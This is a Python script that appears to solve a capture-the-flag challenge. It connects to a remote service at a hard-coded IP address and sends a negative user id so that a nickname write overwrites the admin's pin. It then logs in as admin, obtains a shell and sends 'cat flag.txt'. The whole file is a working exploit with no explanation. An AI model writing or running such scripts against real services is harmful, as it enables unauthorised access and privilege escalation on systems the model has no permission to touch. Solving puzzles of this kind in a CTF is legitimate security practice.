import socket
import readline

host = '127.0.0.1'
port = 9000
host = '120.114.62.211'
port = 3112

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  print(res.decode('ascii'))
  return res

def send(data):
  print('[>] Sending:', data)
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()

pin = b'000000'

# Set admin's pin code
recv('1st user id')
send(b'-4')
recv('1st nickname (modify pin)')
send(pin)
recv('1st pin')
send(b'10')

# Get shell
recv('2nd user id')
send(b'0')
recv('2nd nickname')
send(b'admin')
recv('2nd pin')
send(str(int.from_bytes(pin, 'little')).encode('ascii'))
recv('Shell')

# interact()
get_flag = b'cat flag.txt'
send(get_flag)
recv('Flag')
